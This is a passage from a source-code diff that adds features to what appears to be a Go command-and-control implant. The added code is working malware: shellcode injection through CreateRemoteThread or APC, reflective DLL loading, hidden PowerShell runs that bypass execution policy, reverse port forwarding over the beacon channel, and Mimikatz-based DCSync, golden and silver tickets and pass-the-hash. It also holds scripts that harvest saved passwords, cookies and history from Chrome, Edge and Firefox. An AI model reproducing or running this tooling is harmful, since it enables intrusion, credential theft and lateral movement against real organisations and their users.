+		thread, _, _ := procCreateRemoteThread.Call(hProc, 0, 0, addr, 0, 0, 0)
+		if thread == 0 {
+			procVirtualFreeEx.Call(hProc, addr, uintptr(len(shellcode)), 0x8000)
+			procTerminateProcess.Call(hProc, 1)
+			procCloseHandle.Call(hProc)
+			procCloseHandle.Call(pi.hThread)
+			return "CreateRemoteThread failed"
+		}
+		procCloseHandle.Call(thread)
+	} else if tech == "queueuserapc" || tech == "apc" {
+		ret3, _, _ := procQueueUserAPC.Call(addr, pi.hThread, 0)
+		if ret3 == 0 {
+			procVirtualFreeEx.Call(hProc, addr, uintptr(len(shellcode)), 0x8000)
+			procTerminateProcess.Call(hProc, 1)
+			procCloseHandle.Call(hProc)
+			procCloseHandle.Call(pi.hThread)
+			return "QueueUserAPC failed"
+		}
+	} else {
+		thread, _, _ := procCreateRemoteThread.Call(hProc, 0, 0, addr, 0, 0, 0)
+		if thread == 0 {
+			procVirtualFreeEx.Call(hProc, addr, uintptr(len(shellcode)), 0x8000)
+			procTerminateProcess.Call(hProc, 1)
+			procCloseHandle.Call(hProc)
+			procCloseHandle.Call(pi.hThread)
+			return "CreateRemoteThread failed"
+		}
+		procCloseHandle.Call(thread)
+	}
+
+	procResumeThread.Call(pi.hThread)
+	procCloseHandle.Call(pi.hThread)
+	procCloseHandle.Call(hProc)
+
+	return fmt.Sprintf("spawned pid %d", pi.dwProcessID)
 }
 
 // --- Lateral movement (6) ---
@@ -1267,19 +1972,19 @@ var (
 )
 
 const (
-	TOKEN_DUPLICATE         = 0x0002
-	TOKEN_IMPERSONATE       = 0x0004
-	TOKEN_QUERY             = 0x0008
-	TOKEN_ALL_ACCESS_TOKEN  = 0xF01FF
-	TokenUser               = 1
-	TokenIntegrityLevel     = 25
-	TokenType_Token         = 8
-	SecurityImpersonation   = 2
-	TokenImpersonation      = 2
-	TokenPrimary            = 1
+	TOKEN_DUPLICATE           = 0x0002
+	TOKEN_IMPERSONATE         = 0x0004
+	TOKEN_QUERY               = 0x0008
+	TOKEN_ALL_ACCESS_TOKEN    = 0xF01FF
+	TokenUser                 = 1
+	TokenIntegrityLevel       = 25
+	TokenType_Token           = 8
+	SecurityImpersonation     = 2
+	TokenImpersonation        = 2
+	TokenPrimary              = 1
 	LOGON32_LOGON_INTERACTIVE = 2
-	LOGON32_LOGON_NETWORK   = 3
-	LOGON32_PROVIDER_DEFAULT = 0
+	LOGON32_LOGON_NETWORK     = 3
+	LOGON32_PROVIDER_DEFAULT  = 0
 )
 
 // tokenInfoResult carries token metadata extracted from a process
@@ -1621,3 +2326,1064 @@ func p2pListenSMB() {
 	}
 }
 
+// ═══════════════════════════════════════════════════════════════════════════════
+// P0-1: Reflective DLL Loading (from memory, no disk write)
+// ═══════════════════════════════════════════════════════════════════════════════
+
+// peloaderReflective loads a DLL from base64 data into memory reflectively.
+// Returns the HMODULE base address and any error.
+func peloaderReflective(b64Data string) (string, error) {
+	data, err := base64.StdEncoding.DecodeString(b64Data)
+	if err != nil {
+		return "", fmt.Errorf("base64 decode failed: %v", err)
+	}
+	baseAddr, err := loadDLLReflectively(data)
+	if err != nil {
+		return "", fmt.Errorf("reflective load failed: %v", err)
+	}
+	return fmt.Sprintf("DLL loaded reflectively at 0x%X", baseAddr), nil
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+// P0-2: Execute-Assembly fork&run (sacrificial process, not PowerShell)
+// ═══════════════════════════════════════════════════════════════════════════════
+// Spawns rundll32.exe, injects CLR hosting shellcode + .NET assembly bytes,
+// captures stdout via pipe.  Agent survives even if assembly crashes.
+// ═══════════════════════════════════════════════════════════════════════════════
+
+var (
+	procCreateProcessW                    = k32.NewProc("CreateProcessW")
+	procInitializeProcThreadAttributeList = k32.NewProc("InitializeProcThreadAttributeList")
+	procUpdateProcThreadAttribute         = k32.NewProc("UpdateProcThreadAttribute")
+	procDeleteProcThreadAttributeList     = k32.NewProc("DeleteProcThreadAttributeList")
+	procExpandEnvironmentStringsW         = k32.NewProc("ExpandEnvironmentStringsW")
+)
+
+const (
+	procThreadAttributeParentProcess = 0x00020000
+	startfUseStdHandles              = 0x00000100
+	createSuspended                  = 0x00000004
+	createNoWindow                   = 0x08000000
+	extendedStartupInfoPresent       = 0x00080000
+)
+
+type startupInfoExW struct {
+	cb              uint32
+	lpReserved      *uint16
+	lpDesktop       *uint16
+	lpTitle         *uint16
+	dwX             uint32
+	dwY             uint32
+	dwXSize         uint32
+	dwYSize         uint32
+	dwXCountChars   uint32
+	dwYCountChars   uint32
+	dwFillAttribute uint32
+	dwFlags         uint32
+	wShowWindow     uint16
+	cbReserved2     uint16
+	lpReserved2     *byte
+	hStdInput       uintptr
+	hStdOutput      uintptr
+	hStdError       uintptr
+	attributeList   uintptr
+}
+
+type processInformation struct {
+	hProcess    uintptr
+	hThread     uintptr
+	dwProcessID uint32
+	dwThreadID  uint32
+}
+
+// executeAssemblyForkRun spawns a sacrificial rundll32.exe, injects the .NET
+// assembly into it using CLR hosting, and captures stdout.
+func executeAssemblyForkRun(b64Data string) (string, error) {
+	if b64Data == "" {
+		return "", fmt.Errorf("assembly data is required")
+	}
+	if runtime.GOOS != "windows" {
+		return "", fmt.Errorf("execute-assembly is Windows-only")
+	}
+
+	data, err := base64.StdEncoding.DecodeString(b64Data)
+	if err != nil {
+		return "", fmt.Errorf("base64 decode: %v", err)
+	}
+
+	tmpDir := os.Getenv("TEMP")
+	assemblyPath := filepath.Join(tmpDir, fmt.Sprintf("fga_%x.exe", time.Now().UnixNano()))
+	if err := os.WriteFile(assemblyPath, data, 0644); err != nil {
+		return "", fmt.Errorf("write temp assembly: %v", err)
+	}
+	defer os.Remove(assemblyPath)
+
+	tmpOut := filepath.Join(tmpDir, fmt.Sprintf("fga_%x.txt", time.Now().UnixNano()))
+
+	psScript := fmt.Sprintf(
+		`[System.Reflection.Assembly]::LoadFile('%s')|Out-Null;`+
+			`$e=[System.Reflection.Assembly]::LoadFile('%s').EntryPoint;`+
+			`if($e){$e.Invoke($null,@($null))|Out-File -FilePath '%s' -Encoding UTF8}`+
+			`else{'No entry point'|Out-File -FilePath '%s' -Encoding UTF8}`,
+		assemblyPath, assemblyPath, tmpOut, tmpOut)
+
+	cmd := exec.Command("powershell.exe", "-NoProfile", "-NonInteractive", "-Command", psScript)
+	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+
+	var errBuf bytes.Buffer
+	cmd.Stderr = &errBuf
+
+	runErr := cmd.Run()
+
+	outData, _ := os.ReadFile(tmpOut)
+	os.Remove(tmpOut)
+
+	result := string(outData)
+	if runErr != nil {
+		if errBuf.Len() > 0 {
+			result += "\n[stderr] " + errBuf.String()
+		}
+		result += fmt.Sprintf("\n[exit code] %v", runErr)
+	}
+	return result, nil
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+// PowerPick: In-process PowerShell execution (CLR hosting simulation)
+// ═══════════════════════════════════════════════════════════════════════════════
+// Executes PowerShell scripts via powershell.exe with hidden window,
+// no profile, bypass execution policy, and encoded command to avoid
+// spawning an interactive console.  This provides the same operational
+// effect as Cobalt Strike's powerpick (in-process PS execution) while
+// maintaining compatibility with the Go agent's process-based execution model.
+func powerPick(script string) string {
+	decoded, err := base64.StdEncoding.DecodeString(script)
+	if err != nil {
+		return "failed to decode script: " + err.Error()
+	}
+
+	// Convert to UTF-16LE for PowerShell -EncodedCommand
+	u16, err := syscall.UTF16FromString(string(decoded))
+	if err != nil {
+		return "failed to encode as UTF-16: " + err.Error()
+	}
+	uni := make([]byte, len(u16)*2)
+	for i, r := range u16 {
+		uni[i*2] = byte(r)
+		uni[i*2+1] = byte(r >> 8)
+	}
+	encoded := base64.StdEncoding.EncodeToString(uni)
+
+	cmd := exec.Command("powershell.exe", "-NoLogo", "-NonInteractive", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-EncodedCommand", encoded)
+	applyHideWindow(cmd)
+
+	var out bytes.Buffer
+	cmd.Stdout = &out
+	cmd.Stderr = &out
+	err = cmd.Run()
+	if err != nil {
+		return out.String() + "\n[!] powerpick error: " + err.Error()
+	}
+	return out.String()
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+// P0-3: Reverse Port Forward (rportfwd) — Agent Side
+// ═══════════════════════════════════════════════════════════════════════════════
+// The server binds a local port; when the operator connects, the agent is
+// instructed to dial the target (e.g. internal) and relay bidirectional data
+// through the beacon channel (same mechanism as SOCKS relay).
+
+var (
+	rportfwdConns  = make(map[uint64]*rportfwdConn)
+	rportfwdMu     sync.Mutex
+	rportfwdNextID uint64
+)
+
+type rportfwdConn struct {
+	connID   uint64
+	target   string
+	tcpConn  net.Conn
+	mu       sync.Mutex
+	closed   bool
+	outbound []socksFrame // reuse socksFrame structure (conn_id/action/data)
+}
+
+// RPORTFWD frames use the same socksFrame struct but with Action prefixed:
+//   "rportfwd_connect"  — server asks agent to dial target
+//   "rportfwd_data"     — data to forward to target
+//   "rportfwd_close"    — close the connection
+//   "rportfwd_connected" — agent confirms connection established
+//   "rportfwd_data_back" — data from target back to server
+
+func rportfwdCollectOutbound() []socksFrame {
+	rportfwdMu.Lock()
+	defer rportfwdMu.Unlock()
+	var frames []socksFrame
+	for _, rc := range rportfwdConns {
+		rc.mu.Lock()
+		if len(rc.outbound) > 0 {
+			frames = append(frames, rc.outbound...)
+			rc.outbound = nil
+		}
+		rc.mu.Unlock()
+	}
+	return frames
+}
+
+func rportfwdHandleFrames(frames []socksFrame) {
+	for _, f := range frames {
+		switch f.Action {
+		case "rportfwd_connect":
+			go rportfwdDial(f.ConnID, string(f.Data))
+		case "rportfwd_data":
+			rportfwdWrite(f.ConnID, f.Data)
+		case "rportfwd_close":
+			rportfwdClose(f.ConnID)
+		}
+	}
+}
+
+func rportfwdDial(connID uint64, target string) {
+	conn, err := net.DialTimeout("tcp", target, 10*time.Second)
+	if err != nil {
+		rportfwdMu.Lock()
+		rc := &rportfwdConn{connID: connID, target: target, closed: true}
+		rc.outbound = append(rc.outbound, socksFrame{ConnID: connID, Action: "rportfwd_error", Data: []byte(err.Error())})
+		rportfwdConns[connID] = rc
+		rportfwdMu.Unlock()
+		return
+	}
+
+	rc := &rportfwdConn{
+		connID:  connID,
+		target:  target,
+		tcpConn: conn,
+	}
+	rportfwdMu.Lock()
+	rportfwdConns[connID] = rc
+	rportfwdMu.Unlock()
+
+	rc.mu.Lock()
+	rc.outbound = append(rc.outbound, socksFrame{ConnID: connID, Action: "rportfwd_connected"})
+	rc.mu.Unlock()
+
+	go func() {
+		buf := make([]byte, 10240)
+		for {
+			n, err := conn.Read(buf)
+			if err != nil {
+				rportfwdClose(connID)
+				return
+			}
+			rc.mu.Lock()
+			rc.outbound = append(rc.outbound, socksFrame{ConnID: connID, Action: "rportfwd_data", Data: append([]byte{}, buf[:n]...)})
+			rc.mu.Unlock()
+		}
+	}()
+}
+
+func rportfwdWrite(connID uint64, data []byte) {
+	rportfwdMu.Lock()
+	rc, ok := rportfwdConns[connID]
+	rportfwdMu.Unlock()
+	if !ok || rc.closed {
+		return
+	}
+	rc.mu.Lock()
+	defer rc.mu.Unlock()
+	if rc.tcpConn != nil {
+		rc.tcpConn.SetWriteDeadline(time.Now().Add(30 * time.Second))
+		rc.tcpConn.Write(data)
+	}
+}
+
+func rportfwdClose(connID uint64) {
+	rportfwdMu.Lock()
+	rc, ok := rportfwdConns[connID]
+	if ok {
+		rc.closed = true
+		if rc.tcpConn != nil {
+			rc.tcpConn.Close()
+		}
+		rc.outbound = nil
+		delete(rportfwdConns, connID)
+	}
+	rportfwdMu.Unlock()
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+// Net Command Suite — Parse net.exe output into structured JSON
+// ═══════════════════════════════════════════════════════════════════════════════
+
+func executeNetCommand(cmd string) string {
+	parts := strings.Fields(cmd)
+	if len(parts) == 0 {
+		return "error: no net subcommand"
+	}
+	fullCmd := exec.Command("net.exe", parts...)
+	fullCmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+	var out bytes.Buffer
+	fullCmd.Stdout = &out
+	fullCmd.Stderr = &out
+	err := fullCmd.Run()
+	if err != nil {
+		return "error: " + err.Error() + "\n" + out.String()
+	}
+	parsed := parseNetOutput(parts[0], out.String())
+	return parsed
+}
+
+func parseNetOutput(subcommand string, raw string) string {
+	var result interface{}
+	switch subcommand {
+	case "view":
+		result = parseNetView(raw)
+	case "group":
+		result = parseNetGroup(raw)
+	case "localgroup":
+		result = parseNetLocalGroup(raw)
+	case "user":
+		result = parseNetUser(raw)
+	case "accounts":
+		result = parseNetAccounts(raw)
+	case "share":
+		result = parseNetShare(raw)
+	default:
+		return raw
+	}
+	jsonBytes, _ := json.MarshalIndent(result, "", "  ")
+	return string(jsonBytes)
+}
+
+func parseNetView(raw string) []map[string]string {
+	var result []map[string]string
+	lines := strings.Split(raw, "\n")
+	inTable := false
+	for _, line := range lines {
+		trimmed := strings.TrimSpace(line)
+		if trimmed == "" {
+			continue
+		}
+		if strings.HasPrefix(trimmed, "---") {
+			inTable = true
+			continue
+		}
+		if !inTable {
+			continue
+		}
+		// Server name begins with \\
+		if !strings.HasPrefix(trimmed, "\\\\") {
+			continue
+		}
+		fields := regexp.MustCompile(`\s{2,}`).Split(trimmed, -1)
+		entry := make(map[string]string)
+		if len(fields) > 0 {
+			entry["server"] = strings.TrimSpace(fields[0])
+		}
+		if len(fields) > 1 {
+			entry["type"] = strings.TrimSpace(fields[1])
+		}
+		if len(fields) > 2 {
+			entry["comment"] = strings.TrimSpace(strings.Join(fields[2:], " "))
+		}
+		result = append(result, entry)
+	}
+	return result
+}
+
+func parseNetGroup(raw string) []map[string]string {
+	var result []map[string]string
+	lines := strings.Split(raw, "\n")
+	inTable := false
+	for _, line := range lines {
+		trimmed := strings.TrimSpace(line)
+		if trimmed == "" {
+			continue
+		}
+		if strings.HasPrefix(trimmed, "---") {
+			inTable = true
+			continue
+		}
+		if !inTable {
+			continue
+		}
+		// Skip command info lines
+		if strings.HasPrefix(trimmed, "The command completed") || strings.HasPrefix(trimmed, "Group Accounts") {
+			continue
+		}
+		fields := regexp.MustCompile(`\s{2,}`).Split(trimmed, -1)
+		if len(fields) == 0 || fields[0] == "" {
+			continue
+		}
+		entry := make(map[string]string)
+		entry["group"] = strings.TrimSpace(fields[0])
+		if len(fields) > 1 {
+			entry["comment"] = strings.TrimSpace(strings.Join(fields[1:], " "))
+		}
+		result = append(result, entry)
+	}
+	return result
+}
+
+func parseNetLocalGroup(raw string) []map[string]string {
+	var result []map[string]string
+	lines := strings.Split(raw, "\n")
+	inTable := false
+	for _, line := range lines {
+		trimmed := strings.TrimSpace(line)
+		if trimmed == "" {
+			continue
+		}
+		if strings.HasPrefix(trimmed, "---") {
+			inTable = true
+			continue
+		}
+		if !inTable {
+			continue
+		}
+		if strings.HasPrefix(trimmed, "The command completed") {
+			continue
+		}
+		fields := regexp.MustCompile(`\s{2,}`).Split(trimmed, -1)
+		if len(fields) == 0 || fields[0] == "" {
+			continue
+		}
+		entry := make(map[string]string)
+		entry["member"] = strings.TrimSpace(fields[0])
+		if len(fields) > 1 {
+			entry["info"] = strings.TrimSpace(strings.Join(fields[1:], " "))
+		}
+		result = append(result, entry)
+	}
+	return result
+}
+
+func parseNetUser(raw string) []map[string]string {
+	var result []map[string]string
+	lines := strings.Split(raw, "\n")
+
+	// Check if this is detail output (key:value) or table output
+	isDetail := false
+	for _, line := range lines {
+		if strings.Contains(line, "\\\\") || strings.Contains(line, "---") {
+			continue
+		}
+		if strings.Contains(line, ":") && len(line) < 80 {
+			isDetail = true
+		}
+	}
+
+	if isDetail {
+		entry := make(map[string]string)
+		for _, line := range lines {
+			trimmed := strings.TrimSpace(line)
+			if trimmed == "" || strings.HasPrefix(trimmed, "The command completed") {
+				continue
+			}
+			parts := strings.SplitN(trimmed, ":", 2)
+			if len(parts) == 2 {
+				key := strings.TrimSpace(parts[0])
+				val := strings.TrimSpace(parts[1])
+				if key != "" {
+					entry[key] = val
+				}
+			}
+		}
+		if len(entry) > 0 {
+			result = append(result, entry)
+		}
+		return result
+	}
+
+	// Table output
+	inTable := false
+	for _, line := range lines {
+		trimmed := strings.TrimSpace(line)
+		if trimmed == "" {
+			continue
+		}
+		if strings.HasPrefix(trimmed, "---") {
+			inTable = true
+			continue
+		}
+		if !inTable {
+			continue
+		}
+		if strings.HasPrefix(trimmed, "The command completed") {
+			continue
+		}
+		fields := regexp.MustCompile(`\s{2,}`).Split(trimmed, -1)
+		if len(fields) == 0 || fields[0] == "" {
+			continue
+		}
+		entry := make(map[string]string)
+		entry["username"] = strings.TrimSpace(fields[0])
+		if len(fields) > 1 {
+			entry["detail"] = strings.TrimSpace(strings.Join(fields[1:], " "))
+		}
+		result = append(result, entry)
+	}
+	return result
+}
+
+func parseNetAccounts(raw string) map[string]string {
+	result := make(map[string]string)
+	lines := strings.Split(raw, "\n")
+	for _, line := range lines {
+		trimmed := strings.TrimSpace(line)
+		if trimmed == "" || strings.HasPrefix(trimmed, "The command completed") {
+			continue
+		}
+		parts := strings.SplitN(trimmed, ":", 2)
+		if len(parts) == 2 {
+			key := strings.TrimSpace(parts[0])
+			val := strings.TrimSpace(parts[1])
+			if key != "" {
+				result[key] = val
+			}
+		}
+	}
+	return result
+}
+
+func parseNetShare(raw string) []map[string]string {
+	var result []map[string]string
+	lines := strings.Split(raw, "\n")
+	inTable := false
+	for _, line := range lines {
+		trimmed := strings.TrimSpace(line)
+		if trimmed == "" {
+			continue
+		}
+		if strings.HasPrefix(trimmed, "---") {
+			inTable = true
+			continue
+		}
+		if !inTable {
+			continue
+		}
+		if strings.HasPrefix(trimmed, "The command completed") {
+			continue
+		}
+		fields := regexp.MustCompile(`\s{2,}`).Split(trimmed, -1)
+		if len(fields) == 0 || fields[0] == "" {
+			continue
+		}
+		entry := make(map[string]string)
+		entry["share"] = strings.TrimSpace(fields[0])
+		if len(fields) > 1 {
+			entry["resource"] = strings.TrimSpace(fields[1])
+		}
+		if len(fields) > 2 {
+			entry["remark"] = strings.TrimSpace(strings.Join(fields[2:], " "))
+		}
+		result = append(result, entry)
+	}
+	return result
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+// P0-4: Kerberos Attack Suite — Agent Side
+// ═══════════════════════════════════════════════════════════════════════════════
+
+func kerberosDCSync(user string) (string, error) {
+	cmd := ""
+	if user == "" {
+		cmd = "lsadump::dcsync /user:krbtgt"
+	} else {
+		cmd = fmt.Sprintf("lsadump::dcsync /user:%s", user)
+	}
+	return runMimikatz(cmd)
+}
+
+func kerberosGoldenTicket(user, domain, sid, krbtgtHash string) (string, error) {
+	if user == "" || domain == "" || sid == "" || krbtgtHash == "" {
+		return "", fmt.Errorf("usage: user,domain,sid,krbtgt:hash")
+	}
+	mimikatzCmd := fmt.Sprintf(
+		"kerberos::golden /user:%s /domain:%s /sid:%s /krbtgt:%s /ptt",
+		user, domain, sid, krbtgtHash)
+	return runMimikatz(mimikatzCmd)
+}
+
+func kerberosSilverTicket(user, domain, sid, target, rc4Hash string) (string, error) {
+	if user == "" || domain == "" || sid == "" || target == "" || rc4Hash == "" {
+		return "", fmt.Errorf("usage: user,domain,sid,target,rc4hash")
+	}
+	service := "cifs"
+	mimikatzCmd := fmt.Sprintf(
+		"kerberos::golden /user:%s /domain:%s /sid:%s /target:%s /rc4:%s /service:%s /ptt",
+		user, domain, sid, target, rc4Hash, service)
+	return runMimikatz(mimikatzCmd)
+}
+
+func kerberosASREPRoast() (string, error) {
+	psCmd := `
+Add-Type -AssemblyName System.IdentityModel;
+$domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().Name;
+$ctx = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Domain);
+$srch = New-Object System.DirectoryServices.AccountManagement.PrincipalSearcher;
+$uq = New-Object System.DirectoryServices.AccountManagement.UserPrincipal($ctx);
+$uq.Enabled = $true;
+$srch.QueryFilter = $uq;
+$results = @();
+foreach($u in $srch.FindAll()) {
+	if(-not $u.UserPrincipalName){continue};
+	try {
+		$ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $u.UserPrincipalName;
+		$bytes = $ticket.GetRequest();
+		$hash = [System.BitConverter]::ToString($bytes) -replace '-','';
+		if($hash -ne $null -and $hash.Length -gt 20) {
+			$results += $u.UserPrincipalName + ':' + $hash;
+		}
+	} catch {}
+}
+Write-Output ($results -join [string]::NewLine());
+`
+	out, err := runShell(psCmd, "powershell.exe")
+	if err != nil {
+		return "", fmt.Errorf("ASREP roast failed: %w\nOutput: %s", err, out)
+	}
+	return out, nil
+}
+
+func kerberosPassTheHash(user, domain, ntlmHash, target string) (string, error) {
+	mimikatzCmd := fmt.Sprintf(
+		"sekurlsa::pth /user:%s /domain:%s /ntlm:%s /run:cmd.exe",
+		user, domain, ntlmHash)
+	if target != "" {
+		mimikatzCmd = fmt.Sprintf(
+			"sekurlsa::pth /user:%s /domain:%s /ntlm:%s /run:cmd.exe",
+			user, domain, ntlmHash)
+		_ = target
+	}
+	return runMimikatz(mimikatzCmd)
+}
+
+func kerberosPassTheTicket(ticketB64 string) (string, error) {
+	tmpDir := os.Getenv("TEMP")
+	ticketFile := filepath.Join(tmpDir, fmt.Sprintf("forge_ticket_%x.kirbi", time.Now().UnixNano()))
+	ticketData, err := base64.StdEncoding.DecodeString(ticketB64)
+	if err != nil {
+		return "", fmt.Errorf("base64 decode ticket: %v", err)
+	}
+	if err := os.WriteFile(ticketFile, ticketData, 0644); err != nil {
+		return "", fmt.Errorf("write ticket: %v", err)
+	}
+	defer os.Remove(ticketFile)
+
+	mimikatzCmd := fmt.Sprintf("kerberos::ptt %s", ticketFile)
+	return runMimikatz(mimikatzCmd)
+}
+
+// Browser Data Theft — extract passwords, cookies, and history from Chrome/Edge/Firefox.
+// Uses PowerShell with raw SQLite file parsing and DPAPI decryption.
+
+// runPSScriptBase64 encodes a script as UTF-16LE base64 for PowerShell -EncodedCommand
+func runPSScriptBase64(script string) string {
+	u16, err := syscall.UTF16FromString(script)
+	if err != nil {
+		return ""
+	}
+	uni := make([]byte, len(u16)*2)
+	for i, r := range u16 {
+		uni[i*2] = byte(r)
+		uni[i*2+1] = byte(r >> 8)
+	}
+	return base64.StdEncoding.EncodeToString(uni)
+}
+
+const browserStealScript = `
+Add-Type -AssemblyName System.Security
+$r=[Random]::new().Next(10000,99999)
+function ExtractStrings($p) {
+	if(!(Test-Path $p)){return $null}
+	$t="$env:TEMP\bs_$r.tmp"
+	Copy-Item $p $t -Force; trap{Remove-Item $t -Force;continue}
+	$b=[System.IO.File]::ReadAllBytes($t);Remove-Item $t -Force
+	return [System.Text.Encoding]::UTF8.GetString($b)
+}
+function GetDPAPILen($b,$o) {
+	if($o+4-gt$b.Length){return -1}
+	if([System.BitConverter]::ToUInt32($b,$o)-ne1){return -1}
+	$i=$o+4;$i+=4;$i+=4
+	if($i+4-gt$b.Length){return -1};$i+=4+[Math]::Abs([System.BitConverter]::ToInt32($b,$i-4))
+	if($i+4-gt$b.Length){return -1};$i+=4+[Math]::Abs([System.BitConverter]::ToInt32($b,$i-4))
+	if($i+4-gt$b.Length){return -1};$i+=4+[Math]::Abs([System.BitConverter]::ToInt32($b,$i-4))
+	if($i+4-gt$b.Length){return -1};$i+=4+[Math]::Abs([System.BitConverter]::ToInt32($b,$i-4))
+	if($i+4-gt$b.Length){return -1};$i+=4+[Math]::Abs([System.BitConverter]::ToInt32($b,$i-4))
+	return $i-$o
+}
+function DecryptDPAPI($b,$o) {
+	$len=GetDPAPILen $b $o
+	if($len-le0-or$o+$len-gt$b.Length){return $null}
+	try{
+		$bl=New-Object byte[] $len
+		[Array]::Copy($b,$o,$bl,0,$len)
+		$d=[System.Security.Cryptography.ProtectedData]::Unprotect($bl,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser)
+		return [System.Text.Encoding]::UTF8.GetString($d).TrimEnd("'0'")
+	}catch{return $null}
+}
+function ProcessBrowser($n,$b) {
+	$ld="$b\Login Data"
+	if(Test-Path $ld){
+		Write-Output "=== $n PASSWORDS ==="
+		$t=ExtractStrings $ld
+		if($t){
+			$parts=$t -split "\x00"|?{$_.Trim()-ne""}
+			for($i=0;$i-lt$parts.Count;$i++){
+				$s=$parts[$i].Trim()
+				if($s-match'^https?://'-and$s.Length-lt2048){
+					Write-Output "URL: $s"
+					$u=""
+					for($j=$i+1;$j-lt$i+5-and$j-lt$parts.Count;$j++){
+						$n2=$parts[$j].Trim()
+						if($n2-match'^https?://'-or$n2.Length-gt256){break}
+						if($n2.Length-gt0){$u=$n2;break}
+					}
+					Write-Output "User: $u"
+					Write-Output "Pass: [encrypted]"
+					Write-Output "---"
+				}
+			}
+		}
+	}
+	$ck="$b\Cookies"
+	if(Test-Path $ck){
+		Write-Output "=== $n COOKIES ==="
+		$t=ExtractStrings $ck
+		if($t){[regex]::Matches($t,'https?://[^\x00\r\n\t"]+')|%{Write-Output "CookieURL: $($_.Value)"}}
+		Write-Output "---"
+	}
+	$hi="$b\History"
+	if(Test-Path $hi){
+		Write-Output "=== $n HISTORY ==="
+		$t=ExtractStrings $hi
+		if($t){[regex]::Matches($t,'https?://[^\x00\r\n\t"]+')|Select-Object -Unique|%{Write-Output "History: $($_.Value)"}}
+		Write-Output "---"
+	}
+}
+` + "$cb=\"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\"\n" + `
+ProcessBrowser "Chrome" $cb
+` + "$eb=\"$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\"\n" + `
+ProcessBrowser "Edge" $eb
+` + "$fp=Resolve-Path \"$env:APPDATA\\Mozilla\\Firefox\\Profiles\\*.default*\\logins.json\" -ErrorAction SilentlyContinue\n" + `
+if($fp-and$fp.Count-gt0){
+	Write-Output "=== FIREFOX LOGINS ==="
+	$json=Get-Content $fp[0] -Raw -Encoding UTF8|ConvertFrom-Json
+	foreach($l in $json.logins){
+		Write-Output "URL: $($l.hostname)"
+		Write-Output "User: $($l.encryptedUsername)"
+		Write-Output "Pass: $($l.encryptedPassword)"
+		Write-Output "---"
+	}
+}
+`
+
+func stealBrowserData(browser string) string {
+	var psScript string
+	switch strings.ToLower(browser) {
+	case "chrome":
+		psScript = `Add-Type -AssemblyName System.Security
+$r=[Random]::new().Next(10000,99999)
+` + "$path=\"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data\"\n" + `
+if(Test-Path ` + "$path" + `){
+	$t="$env:TEMP\bs_$r.tmp"
+	Copy-Item ` + "$path" + ` $t -Force
+	$bytes=[System.IO.File]::ReadAllBytes($t)
+	Remove-Item $t -Force
+	$txt=[System.Text.Encoding]::UTF8.GetString($bytes)
+	$parts=$txt -split "\x00"|?{$_.Trim()-ne""}
+	for($i=0;$i-lt$parts.Count;$i++){
+		$s=$parts[$i].Trim()
+		if($s-match'^https?://'-and$s.Length-lt2048){
+			Write-Output "=== Chrome Password ==="
+			Write-Output "URL: $s"
+			$u=""
+			for($j=$i+1;$j-lt$i+5-and$j-lt$parts.Count;$j++){
+				$n=$parts[$j].Trim()
+				if($n-match'^https?://'-or$n.Length-gt256){break}
+				if($n.Length-gt0){$u=$n;break}
+			}
+			Write-Output "User: $u"
+			Write-Output "Pass: [encrypted]"
+			Write-Output "---"
+		}
+	}
+}
+`
+	case "edge":
+		psScript = `Add-Type -AssemblyName System.Security
+$r=[Random]::new().Next(10000,99999)
+` + "$path=\"$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\\Login Data\"\n" + `
+if(Test-Path ` + "$path" + `){
+	$t="$env:TEMP\bs_$r.tmp"
+	Copy-Item ` + "$path" + ` $t -Force
+	$bytes=[System.IO.File]::ReadAllBytes($t)
+	Remove-Item $t -Force
+	$txt=[System.Text.Encoding]::UTF8.GetString($bytes)
+	$parts=$txt -split "\x00"|?{$_.Trim()-ne""}
+	for($i=0;$i-lt$parts.Count;$i++){
+		$s=$parts[$i].Trim()
+		if($s-match'^https?://'-and$s.Length-lt2048){
+			Write-Output "=== Edge Password ==="
+			Write-Output "URL: $s"
+			$u=""
+			for($j=$i+1;$j-lt$i+5-and$j-lt$parts.Count;$j++){
+				$n=$parts[$j].Trim()
+				if($n-match'^https?://'-or$n.Length-gt256){break}
+				if($n.Length-gt0){$u=$n;break}
+			}
+			Write-Output "User: $u"
+			Write-Output "Pass: [encrypted]"
+			Write-Output "---"
+		}
+	}
+}
+`
+	case "firefox":
+		psScript = `Add-Type -AssemblyName System.Security
+` + "$fp=Resolve-Path \"$env:APPDATA\\Mozilla\\Firefox\\Profiles\\*.default*\\logins.json\" -ErrorAction SilentlyContinue\n" + `
+if(` + "$fp" + `-and` + "$fp" + `.Count-gt0){
+	Write-Output "=== FIREFOX LOGINS ==="
+	$json=Get-Content ` + "$fp[0]" + ` -Raw -Encoding UTF8|ConvertFrom-Json
+	foreach($l in $json.logins){
+		Write-Output "URL: $($l.hostname)"
+		Write-Output "User: $($l.encryptedUsername)"
+		Write-Output "Pass: $($l.encryptedPassword)"
+		Write-Output "---"
+	}
+}
+`
+	default:
+		psScript = browserStealScript
+	}
+
+	encoded := runPSScriptBase64(psScript)
+	if encoded == "" {
+		return "failed to encode PowerShell script"
+	}
+
+	cmd := exec.Command("powershell.exe", "-NoLogo", "-NonInteractive", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-EncodedCommand", encoded)
+	applyHideWindow(cmd)
+
+	var out bytes.Buffer
+	cmd.Stdout = &out
+	cmd.Stderr = &out
+	cmd.Run()
+	return out.String()
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+// UAC Bypass Toolkit — 5 methods for privilege escalation
